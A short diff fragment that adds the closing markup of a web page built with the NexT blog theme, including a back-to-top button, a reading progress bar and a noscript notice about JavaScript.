+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
